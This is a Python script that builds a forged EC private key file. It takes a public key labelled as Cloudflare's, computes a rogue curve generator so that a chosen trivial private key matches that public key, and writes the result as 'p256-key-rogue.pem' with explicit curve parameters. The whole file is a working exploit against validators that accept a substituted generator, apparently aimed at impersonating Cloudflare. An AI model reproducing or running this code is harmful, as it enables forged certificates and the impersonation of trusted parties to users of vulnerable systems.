from fastecdsa.curve import P256
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString
from binascii import unhexlify, hexlify
import gmpy2
from Crypto.IO import PEM

# Cloudflare public key
pubkey = b"d156f49cb6e431a0f5a452cfe39a7a86fff286b25eccb559cc11c74edd64fd559c60e3a04bd97854ff4850baa2e1a158758fc7603744164d5599eceed4337a23"
Q = Point(int(pubkey[0:64],16), int(pubkey[64:],16), curve=P256)

# Generate rogue generator
privkey_inv = 2
privkey = gmpy2.invert(privkey_inv,P256.q)
privkey = unhexlify(f'{privkey:x}'.encode())
rogueG = privkey_inv * Q
rogueG = unhexlify(b"04" + f'{rogueG.x:x}'.encode() + f'{rogueG.y:x}'.encode())

# Generate the file with explicit parameters
f = open('p256-key.pem','rt')
keyfile = PEM.decode(f.read())
#print(hexlify(keyfile[0]))
f.close()
seq_der = DerSequence()
der = seq_der.decode(keyfile[0])

# Replace private key
octet_der = DerOctetString(privkey)
der[1] = octet_der.encode()

# Replace public key
print(hexlify(der[3]))
bits_der = DerBitString(unhexlify(b"04" + pubkey))
der[3] = b"\xa1\x44" + bits_der.encode()
print(hexlify(der[3]))

# Replace the generator
#print(hexlify(der[2]))
seq_der = DerSequence()
s = seq_der.decode(der[2][3:])
octet_der = DerOctetString(rogueG)
s[3] = octet_der.encode()
der[2] = der[2][:3] + s.encode()
#print(hexlify(der[2]))

# Generate new file
f = open('p256-key-rogue.pem','w')
print(hexlify(der.encode()))
keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
f.write(keyfile)
f.close()